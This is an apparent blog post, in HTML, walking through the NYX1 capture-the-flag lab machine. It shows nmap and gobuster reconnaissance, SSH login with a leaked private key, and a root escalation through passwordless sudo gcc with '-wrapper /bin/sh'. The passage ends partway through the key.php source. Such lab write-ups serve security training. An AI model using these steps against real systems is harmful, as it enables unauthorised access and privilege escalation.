@@ -1,0 +1,691 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="NYX1 靶机信息收集12345678910111213141516171819202122232425262728293031323334353637383940┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.138[sudo] password for kali: Starting Nmap 7.92 ( https:&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NYX1">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/1d78c8deaa4a.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="NYX1 靶机信息收集12345678910111213141516171819202122232425262728293031323334353637383940┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.138[sudo] password for kali: Starting Nmap 7.92 ( https:&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9528631759b5123a2e4f71f2e36077af_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/d1e81af3774176142e24e8cc59f7ad7e_MD5.png">
+<meta property="article:published_time" content="2023-06-17T03:24:24.000Z">
+<meta property="article:modified_time" content="2023-06-17T07:26:52.903Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/9528631759b5123a2e4f71f2e36077af_MD5.png">
+  
+  
+  
+  <title>NYX1 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NYX1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-17 11:24" pubdate>
+          2023年6月17日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">NYX1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NYX1-靶机"><a href="#NYX1-靶机" class="headerlink" title="NYX1 靶机"></a>NYX1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.138<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00020s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.05 seconds<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,80 192.1.1.138<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00047s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 <span class="hljs-built_in">fc</span>:8b:87:f4:36:<span class="hljs-built_in">cd</span>:7d:0f:d8:f3:16:15:a9:47:f1:0b (RSA)<br>|   256 b4:5c:08:96:02:c6:a8:0b:01:fd:49:68:<span class="hljs-built_in">dd</span>:aa:fb:3a (ECDSA)<br>|_  256 cb:bf:22:93:69:76:60:a4:7d:c0:19:f3:c7:15:e7:3c (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: nyx<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.27 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22 和 80 端口，Linux 操作系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.138<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00027s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   open|filtered ntp<br>135/udp   closed        msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.84 seconds<br></code></pre></td></tr></table></figure>
+
+<p>udp 的扫描结果仅供参考</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.138          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:29 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00023s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-enum: <br>|_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:A7:F7:7B (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>同时，gobuster 开启爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.138/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64 -x txt,zip,sql,rar,php    <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.138/<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              txt,zip,sql,rar,php<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/16 22:29:24 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 276]<br>/key.php              (Status: 200) [Size: 287]<br>/.php                 (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 1319237 / 1323366 (99.69%)===============================================================<br>2023/06/16 22:31:41 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure>
+
+<p>目录爆破的结果中 key.php 是个感兴趣的目录，但是打开网页后发现，没有明显的可以被利用的点，尝试了绕过和爆破都没有成功。</p>
+<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>自带漏洞脚本的扫描结果，给出了一个 php 文件</p>
+<p><img src="/pic/9528631759b5123a2e4f71f2e36077af_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>看起来是私钥文件的内容，title 中给了一些敏感信息 <code>mpampis key</code>，猜测可能是 <code>mpampis</code> 的私钥文件，尝试使用私钥登录，一开始忘了文件权限的问题，修改权限为 600 才登录成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;rW1gDQ8R+yFNAAAAC21wYW1waXNAbnl4AQIDBAUGBw==&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>�!M<br>   mpampis@nyx<br>   <br>┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ ssh -i private mpampis@192.1.1.138      <br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.138 (192.1.1.138)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:y+UuWVNQjou5NV3bhJKmkFBqomxtGR0c5ydJPwmIz+E.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.138<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">Permissions 0644 for &#x27;</span>private<span class="hljs-string">&#x27; are too open.</span><br><span class="hljs-string">It is required that your private key files are NOT accessible by others.</span><br><span class="hljs-string">This private key will be ignored.</span><br><span class="hljs-string">Load key &quot;private&quot;: bad permissions</span><br><span class="hljs-string">mpampis@192.1.1.138\&#x27;</span>s password: <br>Permission denied, please try again.<br>mpampis@192.1.1.138\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">mpampis@192.1.1.138\&#x27;</span>s password: <br>mpampis@192.1.1.138: Permission denied (publickey,password).<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ <span class="hljs-built_in">chmod</span> 600 private     <br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ ssh -i private mpampis@192.1.1.138<br>Linux nyx 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64</span><br>███▄▄▄▄   ▄██   ▄   ▀████    ▐████▀ <br>███▀▀▀██▄ ███   ██▄   ███▌   ████▀  <br>███   ███ ███▄▄▄███    ███  ▐███    <br>███   ███ ▀▀▀▀▀▀███    ▀███▄███▀    <br>███   ███ ▄██   ███    ████▀██▄     <br>███   ███ ███   ███   ▐███  ▀███    <br>███   ███ ███   ███  ▄███     ███▄  <br> ▀█   █▀   ▀█████▀  ████       ███▄ <br>Last login: Fri Aug 14 19:15:05 2020 from 192.168.1.18<br>mpampis@nyx:~$<br></code></pre></td></tr></table></figure>
+
+<h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">mpampis@nyx:~$ <span class="hljs-built_in">cat</span> user.txt <br>2cb67a256530577868009a5944d12637<br>mpampis@nyx:~$ <span class="hljs-built_in">ls</span> -liah<br>total 36K<br>138973 drwxr-xr-x 4 mpampis mpampis 4.0K Aug 14  2020 .<br>    19 drwxr-xr-x 3 root    root    4.0K Aug 14  2020 ..<br>139223 -rw------- 1 mpampis mpampis  490 Aug 14  2020 .bash_history<br>138974 -rw-r--r-- 1 mpampis mpampis  220 Aug 14  2020 .bash_logout<br>138975 -rw-r--r-- 1 mpampis mpampis 3.5K Aug 14  2020 .bashrc<br>139220 drwxr-xr-x 3 mpampis mpampis 4.0K Aug 14  2020 .<span class="hljs-built_in">local</span><br>138976 -rw-r--r-- 1 mpampis mpampis  807 Aug 14  2020 .profile<br>139214 drwx------ 2 mpampis mpampis 4.0K Aug 14  2020 .ssh<br>138981 -rw-r--r-- 1 root    root      33 Aug 14  2020 user.txt<br>mpampis@nyx:~$ <span class="hljs-built_in">tail</span> -n 20 .bash_history <br><span class="hljs-built_in">cd</span> /tmp<br>bash exp.sh <br><span class="hljs-built_in">exit</span><br>bash exp.sh <br><span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">cat</span> exp.sh <br><span class="hljs-built_in">chmod</span> 04755 rootshell<br>bash exp.sh <br><span class="hljs-built_in">ls</span> -la<br>find / -perm -4000 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;<br><span class="hljs-built_in">which</span> screen<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">cd</span> /tmpb<br><span class="hljs-built_in">cd</span> /tmp<br>bash exp.sh <br>screen -r<br>bash exp.sh <br>screen -S listen_for_exception<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br><br>mpampis@nyx:/tmp$ <span class="hljs-built_in">ls</span><br>systemd-private-2647caf04ec346c69dee7cb0c91684b3-apache2.service-WJsXbP<br>systemd-private-2647caf04ec346c69dee7cb0c91684b3-systemd-timesyncd.service-sGyxMv<br>mpampis@nyx:/tmp$ <span class="hljs-built_in">cd</span> -<br>/home/mpampis<br>mpampis@nyx:~$ <span class="hljs-built_in">cat</span> .bash_history | grep <span class="hljs-string">&quot;exp.sh&quot;</span><br>bash exp.sh <br>bash exp.sh <br>bash exp.sh <br><span class="hljs-built_in">cat</span> exp.sh <br>bash exp.sh <br>bash exp.sh <br>bash exp.sh<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>bash_history 文件中的信息意义不大。<code>sudo -l</code> 发现有 gcc 的权限，并且不需要密码，借助于 gtfobin，迅速找到了方法。</p>
+<p><img src="/pic/d1e81af3774176142e24e8cc59f7ad7e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">mpampis@nyx:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> mpampis on nyx:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User mpampis may run the following commands on nyx:<br>    (root) NOPASSWD: /usr/bin/gcc<br>mpampis@nyx:~$ <span class="hljs-built_in">cd</span> /tmp<br>mpampis@nyx:/tmp$ sudo gcc -wrapper /bin/sh,-s .<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>root.txt<br><span class="hljs-comment"># cat root.txt</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="补充：key-php-文件"><a href="#补充：key-php-文件" class="headerlink" title="补充：key .php 文件"></a>补充：key .php 文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat key.php</span><br>&lt;?php<br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;1165685715469&#x27;</span>)&#123;<br>        header(<span class="hljs-string">&quot;Location: d41d8cd98f00b204e9800998ecf8427e.php&quot;</span>);<br>        <span class="hljs-built_in">exit</span>;<br>&#125; elseif (<span class="hljs-variable">$key</span> == <span class="hljs-string">&quot;admin&quot;</span> or <span class="hljs-variable">$key</span> == <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h3&gt;really? lol&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h3&gt;try harder kiddo&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br>&#125;<br>?&gt;<br><br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;key&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;center&gt;<br>&lt;h2&gt;can u find the key!?&lt;/h2&gt;<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span 